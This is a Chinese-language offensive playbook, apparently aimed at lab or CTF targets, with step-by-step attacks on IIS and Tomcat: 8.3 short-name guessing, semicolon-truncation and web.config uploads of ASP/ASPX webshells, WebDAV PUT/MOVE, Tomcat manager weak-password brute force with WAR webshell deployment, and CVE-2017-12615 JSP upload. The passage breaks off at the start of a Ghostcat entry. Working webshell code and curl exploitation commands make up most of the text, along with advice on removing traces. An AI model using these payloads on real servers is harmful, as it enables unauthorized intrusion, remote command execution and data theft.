## [g-iis] IIS——短文件名、分号截断与配置执行

### [iis-shortname] 8.3 短文件名猜解 | medium | 信息泄露;文件名猜解 | 8.3;shortname
> 借助 `~` 通配与响应差异，即使无法列目录也能还原服务器上的文件全名。

#### 这个条目的作用
当你面对一个 IIS 站点，既列不了目录、也没有漏洞直接读文件时，8.3 短文件名猜解能帮你"盲猜"出服务器上存在哪些文件、并还原它们的完整文件名。猜出 `backup~1.zip`、`web~1.config` 这类隐藏备份或配置文件的真实名字后，直接下载即可拿到源码、数据库配置、备份数据等高价值信息。这是 NTFS 文件系统 + IIS 通配匹配共同造成的信息泄露，属于"不知道文件名也能枚举出来"的典型场景。

#### 前置条件
- 目标是 IIS 站点（Windows + NTFS 分区），能够发起任意 HTTP 请求。
- 服务器开启了 8.3 短名生成（NTFS 默认开启，老系统尤其常见）。
- 有一个可猜测的目录（通常从根目录开始，或通过报错、其他漏洞确认了目标目录）。
- 知道 8.3 短名的构成规则：长文件名的前 6 个有效字符 + `~1` + 扩展名的前 3 个字符。例如 `backup_2024.zip` → `backup~1.ZIP`，`web.config` → `web~1.CON`。

#### 第 1 步：建立响应基线
先请求一个"肯定不存在"的路径，记录它的状态码、响应包大小（Content-Length）、错误信息，作为对比基线。之后所有探测响应都要和这个基线比对：

```http
GET /this_file_definitely_not_exists_xyz.txt HTTP/1.1
Host: target
```

预期结果：返回 404（或 403 等错误），记下状态码与 `Content-Length`。如果不行：某些环境下 404 页面长度固定，那就改用响应头差异或延迟差异做判断。

#### 第 2 步：用 `~` 通配确认是否存在 8.3 短名
`*` 在 IIS 的 URL 中会被当作通配符参与匹配，`*~1*` 能匹配任意文件的 8.3 短名。先发一个"万能"探测，确认服务器上到底有没有可猜的短名：

```http
GET /*~1*/.aspx HTTP/1.1
Host: target
```

预期结果：如果存在任何带短名的文件，响应与第 1 步基线不同（常见的是 404 页面长度不同、或状态码不同）；如果和基线一模一样，说明没有短名可猜（或被禁用）。如果不行：把 `.aspx` 换成 `.config`、`.zip`、`.bak` 等常见后缀再试，有些文件短名的匹配只对特定目录生效。

#### 第 3 步：逐字符猜解短名的前 6 位
用 `*` 占住未知部分，每次只确定一个前缀字符。假设目标是根目录下某个文件：

```http
GET /a*~1*/.aspx HTTP/1.1
Host: target
```

预期结果：响应与基线不同 → 存在首字母为 `a` 的短名，接着试 `ab*~1*`；响应与基线相同 → 首字母不是 `a`，换 `b`、`c`…… 直到命中。命中后继续扩展前缀，如 `/back*~1*`、`/backu*~1*`、`/backup*~1*`，最终确定第 1-6 位。如果不行：字母大小写不影响匹配（短名不区分大小写），若全表都无响应差异，考虑文件在子目录而非根目录。

#### 第 4 步：猜解 `~N` 编号与扩展名
前 6 位 + `~1` 是最常见的组合，但同名冲突时会有 `~2`、`~3`（如 `backup~1` 与 `backup~2`），逐个试探：

```http
GET /backup*~2*/.aspx HTTP/1.1
Host: target
```

预期结果：哪个编号与基线不同，就说明存在对应编号的短名。扩展名同理，用通配方式猜出前 3 位：

```http
GET /backup*~1*.* HTTP/1.1
Host: target
```

如果不行：扩展名匹配尝试 `*.zip`、`*.con`、`*.aspx` 等常见类型，或者直接把猜测的完整短名放到后面步骤里验证。

#### 第 5 步：还原完整文件名并验证下载
把猜出的 8.3 短名还原成真实请求路径（短名本身就可以直接当 URL 用），逐个访问确认并下载：

```http
GET /backup~1.zip HTTP/1.1
Host: target
```

```bash
curl -o backup.zip "http://target/backup~1.ZIP"
```

预期结果：能下载到文件 → 信息泄露成立。如果不行：短名叫出来但 403/禁止访问，说明文件存在但目录权限受限，把短名记录下来，配合 PUT、路径穿越等其他漏洞继续利用。

#### 第 6 步：用现成工具批量自动化
手工逐位请求量大，实战中直接用扫描器（IIS_shortname_Scanner、shortscan 等），具体参数以工具 README 为准：

```bash
# IIS_shortname_Scanner（老工具，一般用 python2 跑）
python2 IIS_shortname_Scanner.py http://target/

# shortscan：确认 IIS 6-7.5 上 8.3 泄露，输出匹配到的短名
shortscan http://target/
```

预期结果：工具输出命中的 8.3 短名列表。如果不行：先确认目标不是 IIS，或目标通过注册表/组策略关闭了 8.3 生成（`NtfsDisable8dot3NameCreation`），此时该思路失效。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 所有请求响应长度都一样，无法判断差异 | 8.3 短名生成被禁用，或 CDN/压缩（Content-Encoding: gzip）抹平了长度特征 | 先确认响应头无 `Content-Encoding: gzip`;关闭压缩再测；或放弃该思路 |
| 根目录怎么猜都没反应 | 目标文件不在根目录，而在某个应用子目录 | 先通过报错页、路径穿越、漏洞报告确认真实目录再猜 |
| 命中了前缀但还原不出完整短名 | 目录下同名文件多，`~N` 编号不唯一 | 逐个试探 `~1`~`~9`，并把扩展名猜解也做完 |
| 猜出来的短名直接 404 | 短名匹配的是文件，但该目录禁止直接访问（如 web.config） | 短名已确认存在即可，改用下载时拼接目录或结合其他漏洞读取内容 |
| 扫描工具全是假阳性 | 手工基线没建好，工具误把通配差异当命中 | 手工先验证 1 个字符，确认差异稳定后再放大扫描 |

#### 实战要点
- 8.3 短名格式固定：前 6 位 + `~N` + 扩展名前 3 位，先记牢再开猜。
- 有差异才算命中，比较对象永远是"肯定不存在"的基线响应，不是 200。
- 高价值目标是 `web~1.con`（web.config）、`backup~1.zip`、`*.bak`、`.git` 相关短名。
- 按字母序 + 常见扩展名优先，能大幅减少请求量；注意控制速率避免封 IP。
- 猜出文件名只是第一步，往往要和文件下载、PUT 写入、路径穿越组合成完整利用链。

### [iis-semicolon] 分号截断解析 | easy | 解析绕过 | 分号;%3b
> IIS 把 `;` 之后的内容当作路径参数，`shell.asp;.jpg` 实际请求的是 `shell.asp`。

#### 这个条目的作用
很多上传功能只校验扩展名：只允许 `.jpg`、`.png` 等图片后缀，遇到 `.asp`、`.aspx` 直接拒绝。IIS 的解析器会把 URL 中 `;`（分号）之后的部分当作路径参数丢弃，导致 `shell.asp;.jpg` 在过滤层看来是合法的图片、到了 IIS 手里却按 `shell.asp` 来解析执行。于是攻击者能把 ASP 一句话 webshell 伪装成图片上传，再通过分号截断让它真正被执行，实现命令执行（getshell）。

#### 前置条件
- 目标是 IIS 站点（经典 ASP 处理器），存在文件上传功能。
- 上传点校验的是文件扩展名（允许 jpg/png，拒绝 asp/aspx）。
- IIS 版本与补丁状态支持分号截断（IIS 6 最经典，7.5+ 部分变体已修复，需实测）。
- 上传后的文件能被直接 URL 访问（知道上传目录）。

#### 第 1 步：确认分号截断在当前环境是否有效
先不急着传马，先用一个无害请求验证解析行为。放一个测试文件（或用已存在的 asp 文件）后用分号变体访问：

```http
GET /test.asp;.jpg HTTP/1.1
Host: target
```

预期结果：返回 404 说明目标 asp 文件不存在（被截断了，但没命中文件）；返回 200/执行结果说明截断生效。如果不行：直接访问 `/test.asp` 看是否本身存在，若本身 404 则换一个确定存在的文件再测。

#### 第 2 步：准备 ASP 一句话 webshell
经典 ASP（VBScript 语法）的一句话，参数 `c` 传命令，`Execute` 执行：

```asp
<%execute(request("c"))%>
```

预期结果：这行代码本身无回显，先留着备用。如果不行：确认目标跑的是经典 ASP 而非 ASP.NET（aspx 一句话语法不同，见 web.config 条目）。

#### 第 3 步：以 `shell.asp;.jpg` 为文件名上传
在正常的图片上传处，把文件名改成 `shell.asp;.jpg`（原始名，不做编码），Body 里放第 2 步的一句话代码，伪装成图片提交。用 curl 模拟（`filename=` 里带分号）：

```bash
curl -i -F "file=@shell.asp;filename=shell.asp;.jpg" http://target/upload.php
```

预期结果：上传成功（服务器把 `;.jpg` 当成了扩展名，放行了）。如果不行：部分实现会在服务端剥离/替换特殊字符，试试把分号 URL 编码后再上传（见第 4 步）。

#### 第 4 步：访问验证马是否被执行
按上传返回的路径访问：

```http
GET /upload/shell.asp;.jpg?c=cmd /c whoami HTTP/1.1
Host: target
```

```bash
curl "http://target/upload/shell.asp;.jpg?c=whoami"
```

预期结果：返回当前用户（如 `nt authority\network service`）→ 截断生效、马已执行。如果不行：返回的是图片/下载提示而不是命令输出，说明分号截断没生效，进入变体尝试。

#### 第 5 步：依次尝试编码与空白变体
分号截断有一族变体，逐个试，哪一个能通就用哪一个：

```http
GET /upload/shell.asp%3b.jpg HTTP/1.1
Host: target
```

```http
GET /upload/shell.asp%20.jpg HTTP/1.1
Host: target
```

```http
GET /upload/shell.asp. HTTP/1.1
Host: target
```

```http
GET /upload/shell.asp%00.jpg HTTP/1.1
Host: target
```

预期结果：`%3b` 是分号的 URL 编码（部分环境只认编码形式）；`%20` 空格、末尾一个点、`%00` 空字节截断是老版本的常见玩法。如果不行：若这些变体全部 404/不执行，说明该 IIS 版本已修复此解析缺陷，改用同组的 web.config PUT 或换其他解析漏洞。

#### 第 6 步：确认权限并拓展利用
马能执行后不要急着收工，确认权限与内网可达性，为后续提权/横向打基础：

```bash
curl "http://target/upload/shell.asp;.jpg?c=whoami /all"
curl "http://target/upload/shell.asp;.jpg?c=ipconfig /all"
```

预期结果：拿到当前用户、机器名、IP 段，判断是 NetworkService 还是更高的 LocalSystem。如果不行：命令输出被 `&`、`|` 等符号破坏时,先 URL 编码再传参。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 上传成功但访问 `shell.asp;.jpg` 返回图片/下载 | 分号截断被修复，或处理器不是经典 ASP | 依次试 `%3b`、`%20`、末尾点、`%00` 变体；仍不行则换思路 |
| 文件名里的分号被服务端删掉 | 上传逻辑主动清洗了特殊字符 | 上传时对分号做 URL 编码，或改用 multipart 的 `filename` 双写技巧 |
| 上传直接被拒 | 白名单校验更严格（不仅看扩展名还校验文件头） | 先上传合法图片抓回显/路径，再结合其他写入方式替换内容 |
| 访问返回 404 | 目录猜错或文件没传上去 | 从上传回显中拿真实路径；用目录爆破确认上传目录 |
| 命令输出乱码/截断 | 输出里含 HTML 特殊字符或超长 | 命令参数 URL 编码，一次只执行一条短命令 |

#### 实战要点
- 先验证截断是否生效，再传马，顺序不能反——省得在不可用的环境上浪费轮次。
- 变体优先级：原始分号 → `%3b` → `%20` → 末尾点 → `%00`（老版本专属）。
- 上传回显里的路径一定要拿到，访问错了目录什么都测不出来。
- 一句话 ASP 用 `execute(request("c"))`，别和 aspx、jsp 语法混用。
- IIS 6 是分号/空字节截断的黄金版本，靶场题目大多集中在它身上。

### [iis-webconfig-put] web.config 配置执行与 PUT 写入 | medium | 配置文件;文件上传;WebDAV | web.config;PUT
> 能写入 web.config 就等于拿到了 IIS 7+ 的处理程序注册表，任意后缀都可执行。

#### 这个条目的作用
IIS 7+ 中 `web.config` 是站点级配置，其中 `<system.webServer>/<handlers>` 可以注册"哪个扩展名交给哪个处理器执行"。很多上传防护只过滤 `.aspx`、`.asp`，却不拦 `.config`——于是攻击者上传一个自定义 `web.config`，把 `*.jpg` 映射到 ASP.NET 处理器，再上传内容为 aspx 代码的 `shell.jpg`，图片后缀的"假图片"就会被当成代码执行，绕过扩展名黑名单直接 getshell。另一条路是 IIS 6 默认开启的 WebDAV 写权限：直接 `PUT` 上传任意文件，再用 `MOVE` 改名成 asp 后缀触发执行。

#### 前置条件
- 目标是 IIS 7+（web.config 手法）或 IIS 6（WebDAV 默认开启），有任意文件上传点（放行 `.config`）或 WebDAV 写权限。
- 上传目录允许**脚本执行权限**（IIS 6 的经典错误就是目录只有写权限没有执行权限）。
- 能通过 URL 访问上传后的文件。

#### 第 1 步：探测 WebDAV 是否开启、是否允许 PUT
发 OPTIONS 请求看响应头 `Allow` 字段：

```http
OPTIONS / HTTP/1.1
Host: target
```

```bash
curl -i -X OPTIONS http://target/
```

预期结果：`Allow` 头里出现 `PUT, MOVE, COPY, DELETE, PROPFIND` 等 → WebDAV 开启，走后面的 PUT 路线。如果不行：只有 `GET, HEAD, OPTIONS` → WebDAV 关闭（IIS 7.5 默认关闭），改走 web.config 上传点路线。

#### 第 2 步：准备工作目录，先试写一个测试文件
用 PUT 往根目录放一个无害测试文件，验证写权限真实存在：

```http
PUT /test_put.txt HTTP/1.1
Host: target
Content-Length: 4

test
```

```bash
curl -i -X PUT --data "test" http://target/test_put.txt
```

预期结果：返回 201 Created 或 204 → 写权限 OK，继续。如果不行：返回 403/405 → 匿名用户对根目录没有写权限，去试 `/upload`、`/files` 等已知可写目录（IIS 6 常见错误是上传目录有写权限而根目录没有）。

#### 第 3 步：PUT 上传 ASP 一句话 webshell
把这句话直接 PUT 上去，文件名先用 txt 避开过滤：

```http
PUT /shell.txt HTTP/1.1
Host: target
Content-Length: 30

<%execute(request("c"))%>
```

```bash
printf '<%%execute(request("c"))%%>' > s.txt
curl -i -X PUT --data-binary @s.txt http://target/shell.txt
```

预期结果：201/204，`shell.txt` 已落盘。如果不行：`Content-Length` 与实际字节数不一致会请求挂起/失败，用 `curl --data-binary` 让它自动计算，别手数长度。

#### 第 4 步：MOVE/COPY 把 txt 改成 asp 后缀
PUT 只能写文件，能不能执行看后缀。用 MOVE 请求带 `Destination` 头改名：

```http
MOVE /shell.txt HTTP/1.1
Host: target
Destination: http://target/shell.asp
```

```bash
curl -i -X MOVE -H "Destination: http://target/shell.asp" http://target/shell.txt
```

预期结果：返回 201 → 改名成功。如果不行：403 Forbidden → 目标目录的"脚本执行权限"没开（IIS 6 属性页里"执行权限: 纯脚本"或"脚本和可执行文件"），把马换到有执行权限的目录，或改用 web.config 手法。

#### 第 5 步：验证马、执行命令
```bash
curl "http://target/shell.asp?c=whoami"
```

预期结果：返回命令输出。如果不行：返回的是文件内容/源码 → 后缀没被当脚本执行，检查目录执行权限与 ISAPI 过滤器配置。

#### 第 6 步：web.config handler 手法（上传点路线）
WebDAV 走不通时，用任意文件上传点传 `web.config`。找一个放行 `.config`（或任意后缀）的上传点，上传如下内容（把 `*.jpg` 映射给 ASP.NET 页面处理器）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

预期结果：上传成功且放在站点可访问的目录下。如果不行：上传点过滤了 `.config`，试大小写 `.CONFIG`、加空格/点、或双扩展名变体。

#### 第 7 步：上传"假图片"触发执行
再上传一个内容为 aspx 代码、后缀为 `.jpg` 的文件（比如 `shell.jpg`），内容示例：

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% if (Request["c"] != null) { Process p = Process.Start("cmd", "/c " + Request["c"]); Response.Write(p.StandardOutput.ReadToEnd()); } %>
```

```bash
curl "http://target/shell.jpg?c=whoami"
```

预期结果：第 6 步的 handler 生效后，`shell.jpg` 被 PageHandlerFactory 当作 aspx 执行，`?c=whoami` 返回命令输出。如果不行：确认 `web.config` 与 `shell.jpg` 在同一目录层级，且 handler 的 `path` 与请求路径匹配；IIS 需为 7.0+。

#### 第 8 步：备用变体——直接挂 asp.dll
不想写 aspx 时，把 handler 换成经典 ASP 的 ISAPI 处理器，任意后缀（如 `.x`）都会走 asp.dll：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="x" path="*.x" verb="*" modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

之后上传 `shell.x`（内容为 `<%execute(request("c"))%>`），访问 `http://target/shell.x?c=whoami` 即可执行。预期结果：命令回显。如果不行：`scriptProcessor` 路径在不同系统可能不同，先确认 asp.dll 实际位置，或干脆用第 6-7 步的 PageHandlerFactory 方案。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 根目录 PUT 返回 403/405 | 匿名用户对目录无写权限 | 试上传目录（/upload、/files）；确认目录 ACL 给了 IUSR 写权限 |
| MOVE 改名返回 403 | 目录没有"脚本执行权限" | 换到有执行权限的目录，或用 web.config handler 手法绕过后缀限制 |
| web.config 传上去了但 shell.jpg 还是被下载 | handler 没生效或路径不匹配 | 确认 web.config 与假图片同目录、IIS 7+、`path`/`verb` 写对 |
| PUT 上传带中文/特殊字符失败 | 文件名编码问题 | 用纯字母数字文件名，路径用 URL 编码 |
| 上传点拦截 .config | 黑名单含 config | 试大小写、尾随空格/点、`web.config.txt`（部分环境仍会被解析的策略少见，慎用） |

#### 实战要点
- 先 OPTIONS 看 `Allow`，有 PUT 走 WebDAV 改名路线，没有就赌上传点放行 `.config`。
- PUT 之后必须 MOVE/COPY 改后缀，否则 txt 永远不会被当脚本执行。
- 目录"写权限 + 脚本执行权限"缺一不可，IIS 6 最常栽在只开了写权限。
- web.config 手法本质是"把执行权交给任意后缀"，比单纯绕过扩展名更彻底。
- 用完记得删掉 web.config 和 shell 文件，避免污染靶场环境或暴露痕迹（MOVE 回原名再 DELETE）。

## [g-tomcat] Tomcat——manager 部署、PUT 与 AJP 协议

### [tomcat-manager] Manager 弱口令部署 WAR | easy | 弱口令;部署;getshell | manager;war
> 拿到 manager 后台即拿到 Tomcat 完全控制权：传一个 WAR 包就 RCE。

#### 这个条目的作用
Tomcat 的 manager 管理后台负责应用的部署与卸载。如果它暴露在公网且用的是弱口令（tomcat/tomcat、admin/admin 等），攻击者登录后可以直接上传一个 WAR 包——里面装的是 JSP webshell——Tomcat 会自动解压部署，访问任意一个 JSP 文件即可执行系统命令，一步到位 getshell。这是 Tomcat 靶场里出场率最高的入门利用链，也是"拿下一个中间件后台 = 拿下服务器"的最直观示范。

#### 前置条件
- 目标开放 8080（或自定义端口），`/manager/html` 或 `/manager/text` 可访问。
- `conf/tomcat-users.xml` 中存在带 manager 角色的用户，且口令为弱口令。
- 本地有 JDK（`jar` 命令）或能手工打 ZIP 包（WAR 本质上就是 ZIP）。

#### 第 1 步：探测 manager 后台是否存在
直接访问 manager 路径，看是否弹出 Basic 认证：

```bash
curl -i http://target:8080/manager/html
```

```bash
curl -i http://target:8080/manager/text/list
```

预期结果：返回 401 Unauthorized 且响应头含 `WWW-Authenticate: Basic realm="Tomcat Manager Application"` → manager 存在且需要认证，进入口令爆破。如果不行：返回 404 → manager 应用没部署或被移除；返回 200 → 未授权直接可用（少见但遇到过）。

#### 第 2 步：尝试弱口令登录
用常见组合逐个试，先手工验证一两组，再上字典：

```bash
curl -u tomcat:tomcat http://target:8080/manager/html
curl -u tomcat:s3cret http://target:8080/manager/html
curl -u admin:admin http://target:8080/manager/html
curl -u manager:manager http://target:8080/manager/html
```

预期结果：返回 200 → 口令正确；仍 401 → 继续换。如果不行：手工试 5-10 组仍失败，用 hydra 打 `tomcat` 用户字典：

```bash
hydra -l tomcat -P /usr/share/wordlists/tomcat.txt target http-get /manager/html
```

#### 第 3 步：确认当前用户拥有哪个 manager 角色
manager 的权限按角色细分，部署 WAR 至少需要 `manager-script`（REST 部署）或 `manager-gui`（网页上传）之一。登录后查看 `conf/tomcat-users.xml`：

```bash
curl -u tomcat:tomcat "http://target:8080/manager/text/list"
```

```xml
<!-- conf/tomcat-users.xml 中相关片段 -->
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="tomcat"
      roles="manager-gui,manager-script"/>
```

预期结果：能看到已部署应用列表 → 说明 `manager-script` 或 `manager-gui` 权限可用。如果不行：只有 `manager-status` 这类只读角色会提示 403，此时换个口令或转任意文件读取去读 `tomcat-users.xml`。

#### 第 4 步：本地制作 WAR 包
先建目录写 JSP 一句话（命令执行），再打成 WAR——WAR 要求 `index.jsp` 位于包根目录：

```jsp
<% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("c")); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } } %>
```

```bash
mkdir shell
# 把上面内容保存为 shell/index.jsp
cd shell && jar -cvf ../shell.war *
```

预期结果：生成 `shell.war`，里面是 `index.jsp`。如果不行：系统没有 `jar`，用 zip 命令也一样：`cd shell && zip -r ../shell.war *`（WAR 就是 ZIP 格式）。

#### 第 5 步：REST 方式部署 WAR
用 `manager/text/deploy` 接口远程部署，`path` 指定应用上下文：

```bash
curl -u tomcat:tomcat -T shell.war \
  "http://target:8080/manager/text/deploy?path=/shell"
```

预期结果：返回 `OK - Deployed application at context path /shell` → 部署成功。如果不行：返回 403 → 当前角色不是 `manager-script`，改用网页 `/manager/html` 里的"WAR file to deploy"上传；返回 401 → 口令已失效或被改。

#### 第 6 步：访问 JSP 执行命令
部署后应用路径就是 `/shell`，直接带参数访问：

```bash
curl "http://target:8080/shell/index.jsp?c=id"
curl "http://target:8080/shell/index.jsp?c=cat /etc/passwd"
```

预期结果：返回 `uid=...` 或 passwd 内容 → RCE 成立。如果不行：404 → 检查 WAR 里是否真有 `index.jsp`（`jar tf shell.war` 看内容），或 `path` 与应用名不一致。

#### 第 7 步：会话保持与收尾清理
curl 每次都要带 `-u`，繁琐且可能被日志记录；用 cookie jar 保持认证，最后卸掉 shell 应用：

```bash
# 登录拿 JSESSIONID
curl -c cookies.txt -u tomcat:tomcat http://target:8080/manager/html
# 之后带上 cookie 操作
curl -b cookies.txt "http://target:8080/shell/index.jsp?c=id"
# 利用完毕卸载
curl -b cookies.txt "http://target:8080/manager/text/undeploy?path=/shell"
```

预期结果：`undeploy` 返回 `OK - Undeployed application at context path /shell`。如果不行：卸不掉就删除 `/webapps/shell` 目录，但注意不要误删其他应用。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 一直 401 | 口令不对，或用户被限制在特定 IP | 上字典爆破；确认 manager 应用允许的来源 IP |
| REST deploy 返回 403 | 当前用户的角色只有 manager-gui，没有 manager-script | 改用 `/manager/html` 网页上传 WAR |
| 部署显示 OK 但访问 404 | WAR 结构不对，`index.jsp` 不在根 | `jar tf shell.war` 检查路径，重打 |
| `?c=id` 无输出 | JSP 语法/编码问题，或参数被过滤 | 换标准一句话 JSP；命令先 URL 编码 |
| hydra 全程无命中 | 靶场口令不在常见字典 | 弱口令先手测：tomcat/tomcat、admin/admin、tomcat/s3cret |

#### 实战要点
- 三个入口记清楚：`/manager/html`（图形）、`/manager/text`（REST）、`/manager/status`（只读），getshell 用前两个。
- 部署 WAR 是干净利落的一步 RCE，比找 JSP 上传点省事得多——先试 manager 再想别的。
- 角色权限决定用哪个接口：`manager-script` 走 REST，`manager-gui` 走网页上传。
- 打不进 manager 时，配合任意文件读取读 `conf/tomcat-users.xml`，有时明文口令直接到手。
- 拿到 shell 后记得 `undeploy` 清理，别把马的痕迹留在 webapps 下。

### [tomcat-put-jsp] CVE-2017-12615 PUT 写 JSP | medium | CVE;文件上传 | CVE-2017-12615;PUT
> Windows 上启用 PUT 的 Tomcat 7，用 `/`、`%20`、`::$DATA` 后缀绕过检查写 JSP。

#### 这个条目的作用
CVE-2017-12615 是 Tomcat 7 的一个文件上传漏洞：当默认 servlet 的 `readonly` 参数被设为 `false`（允许 PUT 写文件）时，攻击者可以对任意路径发起 PUT 请求直接上传文件。Tomcat 本来会拦截 `.jsp` 这类敏感后缀，但通过在文件名尾部加 `/`、`%20` 空格或 Windows 特有的 `::$DATA`，可以让校验逻辑"看到"的是合法后缀，而落盘时又被还原成真正的 `.jsp`——于是直接 PUT 一个 JSP webshell 到 webapps 目录，访问即执行，无需任何认证。经典"绕过后缀黑名单写马"案例。

#### 前置条件
- Tomcat 版本在 **7.0.0–7.0.79**，且运行在 **Windows**（`::$DATA` 变体依赖 NTFS）。
- `conf/web.xml` 中 default servlet 的 `readonly` 被设置为 `false`（非默认值，但靶场/老环境常见）。
- 8080 端口可访问，知道 webapps 下的应用上下文路径。

#### 第 1 步：确认版本与平台
先判断目标是否处于漏洞版本范围内，看版本号与指纹：

```bash
curl -i http://target:8080/
# 响应头 Server: Apache-Coyote/1.1；访问不存在的路径看 Tomcat 报错页版本号
```

```bash
nmap -sV -p 8080 target
```

预期结果：确认是 Tomcat 7.0.x（且 ≤ 7.0.79）。如果不行：8.x/9.x 不受此 CVE 影响，改用其他条目；同时确认系统是 Windows（`::$DATA` 变体是 Windows 专属，Linux 上只有 `/` 与 `%20` 变体可用）。

#### 第 2 步：探测 PUT 是否被允许
先 OPTIONS 看 Allow 头，再直接试一个无害 PUT：

```bash
curl -i -X OPTIONS http://target:8080/
```

```bash
curl -i -X PUT --data "test" http://target:8080/test_cve.txt
```

预期结果：`Allow` 含 `PUT`，且 PUT 返回 201/204 → `readonly=false` 生效，漏洞存在。如果不行：PUT 返回 405/403 → 默认配置 `readonly=true`，该环境不受影响，此路不通，换 manager 或 AJP 思路。

#### 第 3 步：直接 PUT 一个普通测试文件定位目录
摸清 webapps 下可写的上下文，比如根应用（`ROOT`）或已知应用目录。先传一个无害文件验证路径可达：

```bash
curl -i -X PUT --data "cve-test" http://target:8080/hello.txt
curl http://target:8080/hello.txt
```

预期结果：能 GET 到内容 → 写目录可用。如果不行：返回 403 说明该路径不可写，试 `/ROOT/hello.txt`、`/examples/hello.txt` 等默认应用目录。

#### 第 4 步：用尾部 `/` 变体 PUT JSP 一句话
核心绕过：文件名末尾加 `/`，校验时被当成目录忽略，落盘后还原成 `.jsp`：

```bash
printf '<%% out.println("ok"); %%>' > s.jsp
curl -X PUT --data-binary @s.jsp "http://target:8080/shell.jsp/"
```

预期结果：返回 201/204。如果不行：确认加了斜杠（目标 URL 以 `/` 结尾），有些环境对 HTTP/1.1 严格解析，加 `--http1.1` 重试。

#### 第 5 步：访问验证 JSP 已可执行
```bash
curl "http://target:8080/shell.jsp"
```

预期结果：页面输出 `ok` → JSP 已上传且可执行，漏洞成立。如果不行：返回 404 → 文件名写歪了（斜杠被处理成目录），用下面两种变体重试；返回 500 → JSP 语法错误，检查代码。

#### 第 6 步：换 `%20` 与 `::$DATA` 变体
前一个变体失败就用另外两个，原理相同：让 Tomcat 的扩展名校验看不到 `.jsp`，落盘时又变回 `.jsp`：

```bash
# 空格变体
curl -X PUT --data-binary @s.jsp "http://target:8080/shell.jsp%20"
curl "http://target:8080/shell.jsp"

# NTFS 数据流变体（仅 Windows）
curl -X PUT --data-binary @s.jsp "http://target:8080/shell.jsp::$DATA"
curl "http://target:8080/shell.jsp"
```

预期结果：`%20` 变体访问 `shell.jsp` 返回 ok；`::$DATA` 变体同样命中同名文件。如果不行：`%20` 在某些严格解析下会被转义成字面空格文件名，逐个访问 `shell.jsp%20`、`shell.jsp` 确认真正落盘的文件名。

#### 第 7 步：升级为命令执行一句话
确认可写 JSP 后，换上传标准命令执行一句话，完整拿 shell：

```jsp
<% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("c")); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } } %>
```

```bash
printf '<%% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("c")); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } } %%>' > shell.jsp
curl -X PUT --data-binary @shell.jsp "http://target:8080/shell.jsp/"
curl "http://target:8080/shell.jsp?c=whoami"
```

预期结果：返回当前用户。如果不行：命令含空格被拆分时,试 `cmd /c` 前缀；或换冰蝎/哥斯拉内存马思路（超出本条目范围）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| PUT 返回 405 | `readonly=true`（默认值），漏洞条件不满足 | 确认 web.xml 配置；不行就换 manager/AJP 思路 |
| 传上去了但访问 404 | 文件名落盘与预期不一致 | 依次访问 `shell.jsp`、`shell.jsp/`、`shell.jsp%20` 找真实文件名 |
| `::$DATA` 无效 | 目标不是 Windows/NTFS | 这是 Windows 专属变体，Linux 上用 `/` 和 `%20` |
| 访问 500 | JSP 代码语法错误 | 用最简单的 `out.println("ok")` 先验证可执行性 |
| PUT 成功但马上被 WAF 拦 | 请求特征太明显 | 加大文件混淆、换路径、控制速率 |

#### 实战要点
- 记住三个变体：尾部 `/`、`%20` 空格、`::$DATA`（仅 Windows），按顺序试。
- 漏洞前提是 `readonly=false`——先 OPTIONS/试 PUT 确认，别在默认配置上浪费时间。
- 上传后文件名可能"长歪"，多试几个候选才能找到真正落盘的名字。
- 写目录选 ROOT 或已知应用上下文，否则 JSP 不会被映射到请求路径上。
- CVE-2017-12615 只影响 7.0.x 且 ≤ 7.0.79，版本不符直接跳过。

### [tomcat-ajp-ghostcat] CVE-2020-1938 Ghostcat AJP 文件读取 | medium | CVE;协议;LFI | CVE-2020-1938;Ghostcat;8009
> 暴露的 AJP（8009）端口可越权读 WEB-INF/web.xml，配合上传点可升级为 RCE。

#### 这个条目的作用
CVE-2020-1938（Ghostcat，幽灵猫）是 Tomcat AJP 协议的任意文件读取漏洞。Tomcat 与前端 Apache/Nginx 之间默认通过 AJP 协议（端口 8009）通信，而 AJP 的请求属性可以由攻击者直接构造：把 `javax.servlet.include.request_uri` 等属性指向任意文件路径，Tomcat 的 Servlet 容器就会把该文件当作请求目标处理——即使该文件位于受保护的 `WEB-INF` 目录。于是无需任何认证，就能越过一切访问控制读取 `WEB-INF/web.xml`、源码、配置文件，拿到数据库口令、反序列化 gadget 线索等敏感信息；配合可写目录或 `allowCustomServlet` 属性，还能升级为 RCE。

#### 前置条件
- 目标开放 AJP 端口 **8009**（默认），且未配置 `secret` 认证（secretRequired=true 为默认，但老版本/默认配置常不生效）。
- 受影响版本：Tomcat 9.0.0.M1–9.0.30、8.5.0–8.5.50、7.0.0–7.0.99（6.x 同样受影响）。
- 本机有 Python3 与 PoC 脚本（ghostcat.py 或 Metasploit 模块）。

#### 第 1 步：探测 8009 端口是否开放
AJP 藏在 8009，先确认它对外可达：

```bash
nmap -p 8009 target
```

```bash
nc -zv target 8009
```

